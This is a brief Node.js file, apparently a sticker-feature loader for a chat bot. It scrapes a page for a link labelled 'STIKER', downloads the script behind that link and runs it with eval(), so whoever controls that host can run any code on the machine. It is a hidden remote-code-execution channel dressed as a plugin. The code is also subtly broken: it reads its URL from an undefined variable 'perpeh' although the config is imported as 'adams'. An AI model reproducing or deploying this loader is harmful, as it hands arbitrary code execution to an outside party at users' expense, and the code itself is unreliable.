const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchSTIKERUrl() {
  try {
    const response = await axios.get(perpeh.HUNCHO_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("STIKER")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('STIKER not found 😭');
    }

    console.log('STIKER loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchSTIKERUrl();
